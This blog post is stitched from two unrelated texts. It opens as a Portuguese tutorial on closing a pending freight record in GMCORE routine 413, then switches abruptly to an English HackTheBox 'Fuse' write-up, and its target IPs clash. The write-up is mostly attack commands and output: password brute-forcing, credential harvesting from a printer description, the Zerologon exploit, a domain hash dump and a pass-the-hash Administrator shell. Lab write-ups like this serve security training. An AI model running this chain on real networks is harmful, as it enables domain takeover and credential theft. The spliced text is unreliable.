---
title: Concluir conhecimento aguardando conclusão.
author: Nilsonlinux
date: 2021-02-13T18:32:00.000-03:00
categories:
- Gmcore
- Tutorial
tags:
- gmcore
- ajuda

---


### GMCORE

Quando o recebimento identificar como falta algum produto e necessitar fazer a devoluçao no ato
do recebimento, a placa ficará em status de descarregado, todavia o conhecimento ficará
aguardando conclusao na rotina 413, segue os passos abaixo para concluir o conhecimento
mediante esta situação.
Para saber o numero do conhecimento abra esta tela aqui:

![imagem 1](https://raw.githubusercontent.com/sistemanpdvs/sistemanpdvs.github.io/master/assets/img/sample/gm1.png)

### PRIMEIRO PASSO

`1` Abra a rotina 413, no botao pesquisar, digita o conhecimento que aparece disponivel na
portaria na própria placa, informe o conhecimento e clica em pesquisar.

![imagem 2](https://raw.githubusercontent.com/sistemanpdvs/sistemanpdvs.github.io/master/assets/img/sample/gm2.png)

### SEGUNDO PASSO

`2` Após pesquisar clique em critica de recebimento na parte inferior do sistema ou aperte F5

![imagem 3](https://raw.githubusercontent.com/sistemanpdvs/sistemanpdvs.github.io/master/assets/img/sample/gm3.png)

### TERCEIRO E ÚLTIMO PASSO

`3` Terceira e ultima parte é clicar em concluir conhecimento, e marcar a impressora pra sair a
devolução, se possível certifique-se tambem no kardex a entrada dos produtos após concluir
o conhecimento.

![imagem 4](https://raw.githubusercontent.com/sistemanpdvs/sistemanpdvs.github.io/master/assets/img/sample/gm4.png)

> Fuse was one of the toughest machine I've ever encountered with lots of new things to learn.


## Reconnaissance

Let's begin with `nmap` to identify open TCP and UDP ports

### Nmap:

```shell
ezi0x00@kali:~/HTB/Fuse$ nmap -sC -sV -A 10.10.10.93

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site does not have a title (text/html).
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-30 02:22:08Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/30%Time=5EFA9DB0%P=x86_64-unknown-linux-gnu%r
SF:(DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver
SF:sion\x04bind\0\0\x10\0\x03");
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h37m41s, deviation: 4h02m32s, median: 17m39s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2020-06-29T19:24:36-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-30T02:24:34
|_  start_date: 2020-06-29T23:19:19

```


### Summary:

1. Port 80 - HTTP Service
2. Port 445 - Microsoft Windows Server 2016 use SMB Service
3. Port 135,49666,49667,49970,49672,49690,49743 - Microsoft Windows RPC (msrpc)
4. Port 139 - Microsoft Windows netbios-ssn 
5. Port 88 -  kerberos-sec
 

## Port 80 - HTTP Service

### http://fuse.fabricorp.local/ 

add it to /etc/hosts to redirect to there: 

![website](/assets/img/Posts/fusewebsite.png)

looking at the smbshares reveals noting, no shares are enabled for anonymous users, but we can We could explore all there CSV files.
after that i just extracted some usernames save it as users.txt

```shell
ezi0x00@kali:~/HTB/Fuse$ cat users.txt 
pmerton
tlavel
sthompson
bhult
administrator
```
## Port 445 - SMB Service

we have smb service is open is used for file sharing on networked computers to talk to each other,
let's see if anonymous login allowed after add fuse.htb to /etc/hosts

```shell
ezi0x00@kali:~/HTB/Fuse$ smbclient -L fuse.htb

Enter WORKGROUP\roots password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```
anonymous login allowed,but nothing there.
but we have users.txt We may need passwords and do smb bruteforce
the best way to generate passwords used cawl 

```shell
ezi0x00@kali:~/HTB/Fuse$ cewl -m5 -d5 -w passwords http://fuse.fabricorp.local /papercut/logs/html/index.htm --with-numbers
```
with usernames and passwords in hand try burteforcing SMB by Metasploit or crackmapexec
i will use Metasploit

```shell
msf5 > use auxiliary/scanner/smb/smb_login                                                                    
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE passwords                                 
pass_file => wordlist
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE users.txt 
USER_file => users.txt   
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS fuse.htb                                                                                          
RHOSTS => fuse.htb                                                                                                                    
msf5 auxiliary(scanner/smb/smb_login) >    
msf5 auxiliary(scanner/smb/smb_login) > exploit
```
After a long time we had that result:
```shell
[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\tlavel:Fabricorp01'
```
so let's login with this user tlavel password Fabricorp01
```shell
ezi0x00@kali:~/HTB/Fuse$ smbclient -L fuse.htb -U tlavel 
Enter WORKGROUP\tlavel's password: 
session setup failed: STATUS_PASSWORD_MUST_CHANGE
```
logging in says password must change, To solve this problem we must use smbpasswd to change smb password,
and we will do it with tlavel.

```shell
ezi0x00@kali:~/HTB/Fuse$ smbpasswd -r fuse.htb -U tlavel
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user tlavel on fuse.htb.
```
Next login smb again with tlavel and new password then we can successfully access to it.
```shell
ezi0x00@kali:~/HTB/Fuse$ smbclient -L fuse.htb -U tlavel
Enter WORKGROUP\tlavels password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	HP-MFT01        Printer   HP-MFT01
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	print$          Disk      Printer Drivers
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
In that share has nothing interesting so leave it.

## Port 135 - MSRPC
>RPC Server An RPC server is a communications interface provided by an application or service,
that allows remote clients to connect, pass commands, and transfer data using the RPC protocol. 

to access RPC will use rpcclient and `enumerating` some data 
login using tlavel 
```shell
rpcclient -U FABRICORP\\tlavel 10.10.10.193
Enter FABRICORP\tlavel's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege 		0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
SeLockMemoryPrivilege 		0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
SeMachineAccountPrivilege 		0:6 (0x0:0x6)
SeTcbPrivilege 		0:7 (0x0:0x7)
SeSecurityPrivilege 		0:8 (0x0:0x8)
SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
SeLoadDriverPrivilege 		0:10 (0x0:0xa)
SeSystemProfilePrivilege 		0:11 (0x0:0xb)
SeSystemtimePrivilege 		0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeShutdownPrivilege 		0:19 (0x0:0x13)
SeDebugPrivilege 		0:20 (0x0:0x14)
SeAuditPrivilege 		0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
SeUndockPrivilege 		0:25 (0x0:0x19)
SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
SeManageVolumePrivilege 		0:28 (0x0:0x1c)
SeImpersonatePrivilege 		0:29 (0x0:0x1d)
SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
SeRelabelPrivilege 		0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
SeTimeZonePrivilege 		0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)
rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\10.10.10.193\HP-MFT01]
	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
	comment:[]

rpcclient $>
```
Finally, found a password but we don't know who username is using this password 
so when enumerating in RPC we found some users
```shell
Administrator
Guest
krbtgt
DefaultAccount
svc-print
bnielson
sthompson
tlavel
pmerton
svc-scan
bhult
dandrews
mberbatov
astein
dmuir
```
But do not think about going back to smb and guess who is using this password. 
Let us think of another way, we can access this `Windows machine`

After searching I found module on metasploit, we can guess they are logged in winrm service
```shell
msf5 auxiliary(scanner/winrm/winrm_login) > set PASSWORD '$fab@s3Rv1ce$1'                                                                
PASSWORD => $fab@s3Rv1ce$1                                                                    
msf5 auxiliary(scanner/winrm/winrm_login) > set USER_FILE users                                                                                  
USER_FILE => users                                                                                            
msf5 auxiliary(scanner/winrm/winrm_login) > set RHOSTS 10.10.10.193                                                                                       
RHOSTS => 10.10.10.193                                                                                                                         
msf5 auxiliary(scanner/winrm/winrm_login) > exploit
```
After a long time we had that result:
```shell
[+] 10.10.10.193:5985 - Login Successful: WORKSTATION\svc-print:$fab@s3Rv1ce$1
```
Now we can access to svc-print with evil-winrm
Evil WinRM is the ultimate WinRM shell.
>WinRM (Windows Remote Management).

```shell
ezi0x00@kali:~/HTB/Fuse$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb                    

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
fabricorp\svc-print
```
go to desktop and you will found `user flag`

## Privilege escaltion
So how we can get root after thinking, found i can use `Zerologon` 
>Zerologon: instantly become domain admin by subverting Netlogon cryptography (CVE-2020-1472).

so i found this [**POC**](https://github.com/risksense/zerologon) to help me 

```shell
ezi0x00@kali:~/HTB/Fuse$ python3 set_empty_pw.py FUSE 10.10.10.193
Performing authentication attempts...
================================================================================================================================
NetrServerAuthenticate3Response
ServerCredential:             
    Data:                            b'\xe5\x8b\x16\x1c\xac\x19\x82\x18'
NegotiateFlags:                  556793855
AccountRid:                      1000
ErrorCode:                      0
```
Reinstalling the original hash is necessary for the DC to continue to operate normally.
```shell
ezi0x00@kali:~/HTB/Fuse$ secretsdump.py -just-dc -no-pass FUSE\$@10.10.10.193
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8ee7fac1bd38751dbff06b33616b87b0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

.....
```
we don't need to crack hash to get password `evil-winrm` can login by hash 

```shell
ezi0x00@kali:~$ sudo evil-winrm -i 10.10.10.193 -u Administrator -H '370ddcf45959b2293427baa70376e14e'[sudo] password for ezi0x00: 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/1/2020   2:03 AM                Contacts
d-r---         6/1/2020   2:03 AM                Desktop
d-r---        6/10/2020   7:18 PM                Documents
d-r---         6/1/2020   2:03 AM                Downloads
d-r---         6/1/2020   2:03 AM                Favorites
d-r---         6/1/2020   2:03 AM                Links
d-r---         6/1/2020   2:03 AM                Music
d-r---         6/1/2020   2:03 AM                Pictures
d-r---         6/1/2020   2:03 AM                Saved Games
d-r---         6/1/2020   2:03 AM                Searches
d-r---         6/1/2020   2:03 AM                Videos
-a----        10/9/2020   7:55 AM     1674242175 patch.msu


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/31/2020   9:43 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
9d47f7d9f4*************
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
